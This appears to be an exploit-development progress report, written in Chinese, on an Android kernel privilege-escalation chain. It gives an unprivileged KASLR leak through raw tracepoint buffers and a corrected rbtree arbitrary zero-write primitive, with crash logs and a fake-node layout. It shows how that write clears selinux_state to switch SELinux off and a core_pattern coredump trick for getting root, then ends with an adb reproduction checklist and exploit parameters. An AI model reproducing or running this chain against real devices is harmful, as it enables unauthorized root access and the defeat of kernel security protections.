# 156 — ★ KASLR 从零泄漏（无特权、可复现）· 零写原语安全化 · SELinux 关闭链

> 2026-10-18 03:55

## 1. 结论先行

**KASLR slide 现在可以从普通 shell 进程读出来了**，每次启动约 40 秒，方法只用
`perfetto`（使能一个静态 tracepoint）+ 读 `trace_pipe_raw`（shell 在 `readtracefs` 组）。

这解掉了从报告 129 以来一直卡住整条链的那个未知量：**有了 slide，`selinux_state`
的地址就是已知的，界面上就只剩下"写 8 个零字节"这一步。**

## 2. 泄漏原理

1. `sched/sched_blocked_reason` 的 tracepoint 载荷里带 `caller = _RET_IP_`
   （内核文本地址，64 位）。文本输出把它格式化成 `%pS`，但**原始环形缓冲区里是裸值**。
2. perfetto 可以精确使能这个事件（已验证：`grep -c sched_blocked_reason trace` = 72/2.5s）。
3. shell 属于 `readtracefs`(3012) 组，`per_cpu/cpuN/trace_pipe_raw` 是
   `root:readtracefs 0400` ⇒ **可读**，且不做 `hash-ptr` 哈希。
4. 扫出所有落在内核文本区间的 64 位值，用 `vmlinux.elf` 的函数符号表求 `slide = v - sym`
   ⇒ 众数即真值。

实测（同一次启动，多个符号交叉验证）：

```
slide = 0x2993400000   _text = 0xffffffea13400000
  0xffffffea135270c0 -> worker_thread+0x260          ✓
  0xffffffea13682214 -> tracing_mark_write+0x94      ✓
  0xffffffea135df640 -> rcu_gp_fqs_loop+0x1dc        ✓
  0xffffffea137925b0 -> folio_wait_bit_common+0x270  ✓
  0xffffffea135de838 -> rcu_gp_kthread+0xc0          ✓
  0xffffffea1392782c -> ep_try_send_events+0x6c      ✓
```

换一次启动（新 boot）同样成立：`slide = 0x1C4A200000` / `0x2BF8200000`，
`grab_blocked.sh` + `slide_now.py` 一条命令即可重算。

> 顺带否掉了 perfetto 的 `symbolize_ksyms`：它确实读了 kallsyms，但只把**符号名**按 iid
> intern 进 trace，**不带地址**（`d2 01 <len> 08 <iid> 12 <len> <name>`）。所以不能靠它拿地址。

## 3. 零写原语：改用「只有左孩子」分支（关键修正）

之前的任意地址零写是把 `__rb_parent_color` 指向 `T-8`，靠 `__rb_change_child` 写
`parent->rb_right = NULL`。**它会污染 `rb_leftmost`**：`rb_next(node)` 返回 `T-8`，
`cleanup_timers` 的 `while (leftmost)` 就会把 `T-8` 当成节点再删一次 —— 而 `T-8`
往往是个热自旋锁，实测直接把它当指针解引用：

```
pc : rb_erase+0x84/0x3a0     lr : timerqueue_del+0x48/0x74
x19: ffffffea15d18628        ← 正是 T-8
x10/x11: 0101000001000000    ← 被当成 parent 的值
Unable to handle ... at 0001000001000000  (WnR=1)
```

**改法**：把伪造节点设成

```
__rb_parent_color = 0     (parent = NULL，红色)
rb_left           = T     (目标地址)
rb_right          = 0
```

`__rb_erase_augmented` 于是走「只有左孩子」分支：

```
tmp->__rb_parent_color = pc = node->__rb_parent_color = 0   ⇒ *(T) = 0   ← 零写
parent = __rb_parent(0) = NULL                              ⇒ 只写 root->rb_node
rebalance = NULL
```

而 `rb_next(node)` 因为 `rb_right==0` 且 `parent==0` **直接返回 NULL**
⇒ `rb_leftmost` 不被污染 ⇒ `cleanup_timers` 的循环下一轮读到 NULL 就结束，
**没有第二次迭代**。这是 `poc/posix64560/t64560_v33.c`。

## 4. 目标：`selinux_state`（.bss）

```
selinux_state @ link 0xffffffc082918630   (在 .bss，段 1，filesz=0)
  +0x00 enforcing    (bool)
  +0x01 initialized  (bool)
  +0x02 policycap[]  (u8[14])
```

从结构首字节写 8 个零 ⇒ `enforcing=0` 且 `initialized=0`。
`initialized=0` 会让 SELinux 的所有 hook 直接早退（比单纯 permissive 更彻底）。

- 目标 8 字节对齐 ✓
- 该分支**不读** `T` 的内容（只写），所以 `T-8` 是什么都无所谓 ✓

## 5. 拿到 root 的最后一步（已就绪，未执行）

SELinux 一关，`hypsys_system`(uid 0, 全 caps) 就不再被 `proc_sys_kernel` 拦住：

1. `log -t FBW '|/system/bin/sh /data/local/tmp/r.sh'`
   + root `logcat -v raw -s FBW -f /proc/sys/kernel/core_pattern -d`
   ⇒ core_pattern 变成管道处理器；
2. 跑 `coredump`（`RLIMIT_CORE=inf` + SIGSEGV）⇒ 内核以 **root** 执行 r.sh；
3. r.sh：关 enforce、导出 `/proc/iomem`/`kallsyms`（root-only 验证）、
   chmod 工具、`insmod /data/local/tmp/ksu.ko`（MODULE_SIG_FORCE 未设）。

工具：`poc/rootshell/{r.sh,coredump.c}`、`analysis/post_permissive.py`（自动轮询+触发）。

## 6. 复现清单

```
# 1) 取 slide（每次启动一次）
adb push poc/kprobe/grab_blocked.sh /data/local/tmp/ && adb shell /data/local/tmp/grab_blocked.sh
adb pull /data/local/tmp/bl_0.bin ... ; python analysis/slide_now.py analysis/out/blocked
# 2) 算目标
T = 0xffffffc082918630 + slide
# 3) 打
adb shell "/data/local/tmp/t64560_v33 800 400 16 6000 12000 $T"
# 4) 监视 + 自动提权
python analysis/post_permissive.py
```

## 7. 附：本轮排除/确认的其它事实

| 事项 | 结论 |
|---|---|
| 参考实现的 `PHYS_DELTA`（linear-map 别名法） | 需要 `/proc/iomem`，本机 hypsys 也被拒；`/proc/device-tree` 只能列目录、属性读取全部 EACCES；`/sys/firmware/{memmap,fdt}` 不存在/被拒；bugreport 不含 iomem；本地无固件镜像 ⇒ **不必走这条路**（有 slide 更直接） |
| boot.img 的"偏移表" | 只是符号偏移 + `imagePhys`；符号我们有更准的（vmlinux symtab + BTF），物理参数在真机上拿不到 |
| `/proc/net/unix` 的 `%pK` | hypsys 也 Permission denied（`proc_net`） |
| `simpleperf` / `kmem` tracepoint | 见报告 154，全封 |
